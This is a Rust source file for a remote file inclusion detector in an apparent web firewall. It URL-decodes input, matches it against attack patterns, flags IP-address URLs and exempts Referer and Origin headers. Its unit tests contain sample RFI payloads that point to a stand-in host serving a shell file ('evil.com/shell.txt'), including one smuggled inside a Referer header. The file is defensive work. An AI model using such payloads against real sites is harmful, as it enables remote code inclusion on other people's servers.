use aho_corasick::AhoCorasick;
use regex::Regex;
use std::borrow::Cow;
use std::sync::Arc;
use std::sync::LazyLock;

use crate::attack_detection::config::{AttackDetectionResult, AttackType, InputLocation};
use crate::attack_detection::detector_common::{BasePatternDetector, PatternDetector};
use crate::attack_detection::patterns::DefaultPatterns;
use synvoid_core::url::{check_regex_complexity, url_decode_all};

const IP_REGEX_PATTERN: &str = r"https?://(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})";

static IP_REGEX: LazyLock<Option<Regex>> = LazyLock::new(|| {
    let result = check_regex_complexity(IP_REGEX_PATTERN);
    if !result.safe {
        tracing::warn!(
            reason = ?result.reason,
            "RFI IP regex pattern failed complexity check"
        );
        return None;
    }
    Regex::new(IP_REGEX_PATTERN).ok()
});

pub struct RfiDetector {
    inner: BasePatternDetector,
}

fn is_referer_or_origin(location: &InputLocation) -> bool {
    location
        .header_name()
        .is_some_and(|n| n.eq_ignore_ascii_case("referer") || n.eq_ignore_ascii_case("origin"))
}

impl RfiDetector {
    pub fn new(paranoia_level: u8, custom_patterns: &[String]) -> Self {
        let inner = BasePatternDetector::new(
            DefaultPatterns::rfi().as_slice(),
            DefaultPatterns::rfi_high().as_slice(),
            custom_patterns,
            paranoia_level,
            AttackType::Rfi,
            "rfi",
        );
        Self { inner }
    }

    fn detect_with_url_decode(
        &self,
        input: &str,
        location: InputLocation,
    ) -> Option<AttackDetectionResult> {
        // Avoid allocation when already lowercase (see M-07). ASCII check
        // suffices: attack patterns are ASCII.
        let input_lower: Cow<str> = if input.bytes().any(|b| b.is_ascii_uppercase()) {
            Cow::Owned(input.to_ascii_lowercase())
        } else {
            Cow::Borrowed(input)
        };
        let decoded: Cow<str> = if input_lower.contains('%') || input_lower.contains('+') {
            Cow::Owned(url_decode_all(&input_lower))
        } else {
            input_lower.clone()
        };

        if let Some(mat) = self.inner.patterns_ref().find(decoded.as_ref()) {
            let matched = decoded[mat.start()..mat.end()].to_string();
            tracing::warn!(
                attack_type = "rfi",
                matched_pattern = %matched,
                location = %location,
                "RFI attack detected"
            );
            return Some(AttackDetectionResult {
                attack_type: AttackType::Rfi,
                fingerprint: None,
                matched_pattern: Some(matched),
                input_location: location,
            });
        }

        if let Some(ip_regex) = IP_REGEX.as_ref() {
            if !is_referer_or_origin(&location) && ip_regex.is_match(&decoded) {
                tracing::warn!(
                    attack_type = "rfi",
                    location = %location,
                    "RFI with IP address detected"
                );
                return Some(AttackDetectionResult {
                    attack_type: AttackType::Rfi,
                    fingerprint: None,
                    matched_pattern: Some("ip_in_url".to_string()),
                    input_location: location,
                });
            }
        }

        None
    }
}

impl PatternDetector for RfiDetector {
    fn patterns(&self) -> &Arc<AhoCorasick> {
        self.inner.patterns()
    }

    fn attack_type(&self) -> AttackType {
        AttackType::Rfi
    }

    fn detect(&self, input: &str, location: InputLocation) -> Option<AttackDetectionResult> {
        self.detect_with_url_decode(input, location)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rfi_basic() {
        let detector = RfiDetector::new(2, &[]);
        assert!(detector
            .detect(
                "?file=http://evil.com/shell.txt",
                InputLocation::QueryString
            )
            .is_some());
    }

    #[test]
    fn test_rfi_ip_address() {
        let detector = RfiDetector::new(2, &[]);
        assert!(detector
            .detect(
                "http://192.168.1.1/malicious.txt",
                InputLocation::QueryString
            )
            .is_some());
    }

    #[test]
    fn test_rfi_benign() {
        let detector = RfiDetector::new(2, &[]);
        assert!(detector
            .detect("/api/files?id=123", InputLocation::QueryString)
            .is_none());
    }

    #[test]
    fn test_rfi_referer_ip_exempt() {
        let detector = RfiDetector::new(2, &[]);
        assert!(detector
            .detect(
                "http://192.168.182.143:8082/static/css/public.css",
                InputLocation::Header("referer".into())
            )
            .is_none());
        assert!(detector
            .detect(
                "http://192.168.182.143:8082/",
                InputLocation::Header("origin".into())
            )
            .is_none());
    }

    #[test]
    fn test_rfi_referer_smuggled_pattern_still_blocked() {
        let detector = RfiDetector::new(2, &[]);
        assert!(detector
            .detect(
                "x?file=http://evil.com/shell.txt",
                InputLocation::Header("referer".into())
            )
            .is_some());
    }
}
